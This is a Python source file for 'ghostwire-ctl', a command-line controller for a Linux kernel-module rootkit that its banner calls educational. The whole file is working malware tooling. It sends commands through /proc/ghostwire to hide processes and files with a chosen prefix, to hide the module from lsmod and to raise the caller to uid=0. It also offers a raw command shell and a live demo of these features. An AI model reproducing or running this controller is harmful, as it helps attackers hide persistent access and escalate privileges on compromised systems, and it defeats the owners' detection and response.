#!/usr/bin/env python3
"""
ghostwire-ctl — CLI controller for the ghostwire LKM rootkit PoC
Author: 0xNullVector

Usage:
    sudo python3 ghostwire-ctl.py [command] [args]

Commands:
    status                  — print current rootkit state
    hide-pid   <pid>        — hide a process by PID
    show-pid   <pid>        — unhide a process by PID
    set-prefix <prefix>     — set the file hiding prefix (default: .gw_)
    hide-module             — conceal LKM from lsmod / /proc/modules
    show-module             — re-expose LKM
    privesc                 — escalate calling process to uid=0
    shell                   — drop into an interactive command shell
    demo                    — run a live demonstration of all features

Requires: root, ghostwire.ko loaded
"""

import os
import sys
import time
import argparse
import subprocess
from pathlib import Path

# ─────────────────────────────────────────────
#  Constants
# ─────────────────────────────────────────────

PROC_PATH   = "/proc/ghostwire"
VERSION     = "1.0.0"
BANNER      = r"""
  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗    ██╗██╗██████╗ ███████╗
 ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██║    ██║██║██╔══██╗██╔════╝
 ██║  ███╗███████║██║   ██║███████╗   ██║   ██║ █╗ ██║██║██████╔╝█████╗  
 ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██║███╗██║██║██╔══██╗██╔══╝  
 ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ╚███╔███╔╝██║██║  ██║███████╗
  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚══════╝
              ghostwire-ctl v{ver} — 0xNullVector
              educational LKM rootkit controller
""".format(ver=VERSION)

# ANSI colour helpers
R  = "\033[91m"   # red
G  = "\033[92m"   # green
Y  = "\033[93m"   # yellow
C  = "\033[96m"   # cyan
DIM= "\033[2m"
B  = "\033[1m"
NC = "\033[0m"    # reset

# ─────────────────────────────────────────────
#  Core helpers
# ─────────────────────────────────────────────

def check_root():
    if os.geteuid() != 0:
        die("ghostwire-ctl must be run as root.")

def check_module():
    if not Path(PROC_PATH).exists():
        die(f"Control interface {PROC_PATH} not found.\n"
             "  → Is ghostwire.ko loaded?  Run: sudo insmod ghostwire.ko")

def send_command(cmd: str):
    """Write a command string to /proc/ghostwire."""
    try:
        with open(PROC_PATH, "w") as f:
            f.write(cmd + "\n")
    except PermissionError:
        die("Permission denied writing to /proc/ghostwire — are you root?")
    except OSError as e:
        die(f"Failed to send command: {e}")

def read_status() -> str:
    try:
        with open(PROC_PATH, "r") as f:
            return f.read()
    except OSError as e:
        die(f"Failed to read status: {e}")

def ok(msg):   print(f"  {G}[+]{NC} {msg}")
def info(msg): print(f"  {C}[*]{NC} {msg}")
def warn(msg): print(f"  {Y}[!]{NC} {msg}")
def die(msg):
    print(f"  {R}[✗]{NC} {B}{msg}{NC}", file=sys.stderr)
    sys.exit(1)

def separator():
    print(f"  {DIM}{'─' * 60}{NC}")

# ─────────────────────────────────────────────
#  Command implementations
# ─────────────────────────────────────────────

def cmd_status(_args):
    raw = read_status()
    print(f"\n  {B}ghostwire kernel state{NC}")
    separator()
    for line in raw.strip().splitlines():
        key, _, val = line.partition(" : ")
        if val:
            print(f"  {C}{key.strip():<18}{NC} {val.strip()}")
        else:
            print(f"  {DIM}{line}{NC}")
    separator()
    print()

def cmd_hide_pid(args):
    pid = args.pid
    info(f"Hiding PID {pid}...")
    send_command(f"HIDE_PID {pid}")
    ok(f"PID {pid} is now hidden from /proc, ps, top")

def cmd_show_pid(args):
    pid = args.pid
    info(f"Unhiding PID {pid}...")
    send_command(f"SHOW_PID {pid}")
    ok(f"PID {pid} is now visible again")

def cmd_set_prefix(args):
    prefix = args.prefix
    info(f"Setting file hide prefix to: '{prefix}'")
    send_command(f"SET_PREFIX {prefix}")
    ok(f"Files/dirs starting with '{prefix}' are now invisible to getdents64")

def cmd_hide_module(_args):
    warn("Concealing LKM from lsmod / /proc/modules...")
    send_command("HIDE_MODULE")
    ok("Module removed from visible kernel module list")
    warn("Note: rmmod will fail while hidden. Use show-module first to restore.")

def cmd_show_module(_args):
    info("Re-exposing module in lsmod...")
    send_command("SHOW_MODULE")
    ok("Module is now visible again")

def cmd_privesc(_args):
    warn("Executing credential escalation for current process...")
    send_command("PRIVESC")
    ok("Credentials patched — you should now be uid=0")
    info("Verify with: id")

def cmd_shell(_args):
    """Interactive REPL for sending raw commands."""
    print(f"\n  {C}ghostwire interactive shell{NC}  (type 'exit' to quit, 'help' for commands)\n")
    commands = {
        "HIDE_PID <pid>", "SHOW_PID <pid>", "SET_PREFIX <str>",
        "HIDE_MODULE", "SHOW_MODULE", "PRIVESC", "STATUS"
    }
    while True:
        try:
            raw = input(f"  {R}gw>{NC} ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not raw:
            continue
        if raw.lower() == "exit":
            break
        if raw.lower() == "help":
            print(f"\n  {C}Available commands:{NC}")
            for c in sorted(commands):
                print(f"    {c}")
            print()
            continue
        if raw.upper() == "STATUS":
            cmd_status(None)
            continue

        try:
            send_command(raw)
            ok(f"Sent: {raw}")
        except SystemExit:
            pass

def cmd_demo(_args):
    """Walk through all rootkit features with live output."""
    print(f"\n  {B}{Y}╔══════════════════════════════════════════╗{NC}")
    print(f"  {B}{Y}║   ghostwire live feature demonstration   ║{NC}")
    print(f"  {B}{Y}╚══════════════════════════════════════════╝{NC}\n")

    def step(title, fn, *a):
        print(f"\n  {B}── {title} ──{NC}")
        time.sleep(0.4)
        fn(*a)
        time.sleep(0.6)

    class A:
        pass

    # 1. Status
    step("Current State", cmd_status, A())

    # 2. Hide own PID
    own_pid = os.getpid()
    a = A(); a.pid = own_pid
    step(f"Hiding own PID ({own_pid})", cmd_hide_pid, a)
    info(f"Verifying: kill -0 {own_pid} from another process would return ESRCH")

    # 3. File prefix demo
    a = A(); a.prefix = ".gw_"
    step("File Hiding (prefix demo)", cmd_set_prefix, a)
    info("Any file/dir starting with '.gw_' is now invisible to ls/find")

    # 4. Module hiding
    step("Module Self-Concealment", cmd_hide_module, A())
    result = subprocess.run(["lsmod"], capture_output=True, text=True)
    if "ghostwire" not in result.stdout:
        ok("Confirmed: 'ghostwire' absent from lsmod output")
    else:
        warn("Module still visible — kernel version may use different list offset")

    # 5. Re-expose module
    step("Re-exposing Module", cmd_show_module, A())

    # 6. Unhide own PID
    a = A(); a.pid = own_pid
    step(f"Restoring PID {own_pid}", cmd_show_pid, a)

    # Final status
    step("Final State", cmd_status, A())

    print(f"  {G}{B}Demo complete.{NC}\n")

# ─────────────────────────────────────────────
#  Argument parser
# ─────────────────────────────────────────────

def build_parser():
    p = argparse.ArgumentParser(
        prog="ghostwire-ctl",
        description="ghostwire LKM rootkit controller — 0xNullVector",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    p.add_argument("--no-banner", action="store_true", help="suppress ASCII banner")
    sub = p.add_subparsers(dest="command", metavar="command")

    sub.add_parser("status",      help="print rootkit state")
    sub.add_parser("hide-module", help="hide LKM from lsmod")
    sub.add_parser("show-module", help="re-expose LKM in lsmod")
    sub.add_parser("privesc",     help="escalate current process to uid=0")
    sub.add_parser("shell",       help="interactive command shell")
    sub.add_parser("demo",        help="live feature walkthrough")

    hp = sub.add_parser("hide-pid", help="hide a process by PID")
    hp.add_argument("pid", type=int, metavar="PID")

    sp = sub.add_parser("show-pid", help="unhide a process by PID")
    sp.add_argument("pid", type=int, metavar="PID")

    pp = sub.add_parser("set-prefix", help="set file hiding prefix")
    pp.add_argument("prefix", metavar="PREFIX")

    return p

# ─────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────

COMMAND_MAP = {
    "status":      cmd_status,
    "hide-pid":    cmd_hide_pid,
    "show-pid":    cmd_show_pid,
    "set-prefix":  cmd_set_prefix,
    "hide-module": cmd_hide_module,
    "show-module": cmd_show_module,
    "privesc":     cmd_privesc,
    "shell":       cmd_shell,
    "demo":        cmd_demo,
}

def main():
    parser = build_parser()
    args = parser.parse_args()

    if not args.no_banner:
        print(BANNER)

    check_root()
    check_module()

    if not args.command:
        parser.print_help()
        sys.exit(0)

    fn = COMMAND_MAP.get(args.command)
    if fn:
        fn(args)
    else:
        die(f"Unknown command: {args.command}")

if __name__ == "__main__":
    main()
